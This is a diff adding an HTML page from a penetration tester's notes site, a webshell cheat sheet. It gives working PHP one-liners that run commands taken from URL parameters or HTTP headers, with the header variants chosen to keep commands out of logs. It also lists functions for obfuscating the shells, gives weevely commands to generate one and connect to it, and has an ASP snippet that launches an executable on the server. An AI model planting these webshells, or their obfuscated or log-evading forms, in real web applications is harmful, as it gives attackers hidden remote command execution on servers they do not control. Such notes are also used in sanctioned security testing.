@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Webshells - Notes</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Webshell", url: "#_top", children: [
+              {title: "PHP", url: "#php" },
+              {title: "ASP", url: "#asp" },
+              {title: "References", url: "#references" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../gdb/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../gdb/" class="btn btn-xs btn-link">
+        GDB
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../wget/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../wget/" class="btn btn-xs btn-link">
+        Wget
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="webshell">Webshell<a class="headerlink" href="#webshell" title="Permanent link">#</a></h1>
+<p>A webshell is a shell that you can access through the web. This is useful for when you have firewalls that filter outgoing traffic on ports other than port 80. As long as you have a webserver, and want it to function, you can't filter our traffic on port 80 (and 443). It is also a bit more stealthy than a reverse shell on other ports since the traffic is hidden in the http traffic.</p>
+<p>You have access to different kinds of webshells on Kali here:</p>
+<pre><code>/usr/share/webshells
+</code></pre>
+
+<h2 id="php">PHP<a class="headerlink" href="#php" title="Permanent link">#</a></h2>
+<p>This code can be injected into pages that use php.</p>
+<pre><code class="php">
+# Execute one command
+&lt;?php system(&quot;whoami&quot;); ?&gt;
+
+# Take input from the url paramter. shell.php?cmd=whoami
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# The same but using passthru
+&lt;?php passthru($_GET['cmd']); ?&gt;
+
+# For shell_exec to output the result you need to echo it
+&lt;?php echo shell_exec(&quot;whoami&quot;);?&gt;
+
+# Exec() does not output the result without echo, and only output the last line. So not very useful!
+&lt;?php echo exec(&quot;whoami&quot;);?&gt;
+
+# Instead to this if you can. It will return the output as an array, and then print it all.
+&lt;?php exec(&quot;ls -la&quot;,$array); print_r($array); ?&gt;
+
+# preg_replace(). This is a cool trick
+&lt;?php preg_replace('/.*/e', 'system(&quot;whoami&quot;);', ''); ?&gt;
+
+# Using backticks
+&lt;?php $output = `whoami`; echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;; ?&gt;
+
+# Using backticks
+&lt;?php echo `whoami`; ?&gt;
+</code></pre>
+
+<p>You can then call then execute the commands like this:</p>
+<pre><code>http://192.168.1.103/index.php?cmd=pwd
+</code></pre>
+
+<h3 id="make-it-stealthy">Make it stealthy<a class="headerlink" href="#make-it-stealthy" title="Permanent link">#</a></h3>
+<p>We can make the commands from above a bit more stealthy. Instead of passing the cmds through the url, which will be obvious in logs, we cna pass them through other header-paramters. The use tampterdata or burpsuite to insert the commands. Or just netcat or curl.</p>
+<pre><code class="php">&lt;?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?&gt;
+&lt;?php system($_SERVER['HTTP_USER_AGENT'])?&gt;
+
+# I have had to use this one
+&lt;?php echo passthru($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?&gt;
+</code></pre>
+
+<h3 id="obfuscation">Obfuscation<a class="headerlink" href="#obfuscation" title="Permanent link">#</a></h3>
+<p>The following functions can be used to obfuscate the code.</p>
+<pre><code>eval()
+assert()
+base64()
+gzdeflate()
+str_rot13()
+</code></pre>
+
+<h3 id="weevely-incredible-tool">Weevely - Incredible tool!<a class="headerlink" href="#weevely-incredible-tool" title="Permanent link">#</a></h3>
+<p>Using weevely we can create php webshells easily.</p>
+<pre><code>weevely generate password /root/webshell.php
+</code></pre>
+
+<p>Not we execute it and get a shell in return:</p>
+<pre><code>weevely &quot;http://192.168.1.101/webshell.php&quot; password
+</code></pre>
+
+<h2 id="asp">ASP<a class="headerlink" href="#asp" title="Permanent link">#</a></h2>
+<pre><code>&lt;%
+Dim oS
+On Error Resume Next
+Set oS = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)
+Call oS.Run(&quot;win.com cmd.exe /c c:\Inetpub\shell443.exe&quot;,0,True)
+%&gt;
+</code></pre>
+
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">#</a></h2>
+<p>http://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/
+http://www.binarytides.com/web-shells-tutorial/</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../gdb/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../gdb/" class="btn btn-xs btn-link">
+        GDB
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../wget/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../wget/" class="btn btn-xs btn-link">
+        Wget
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/tools/webshell.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
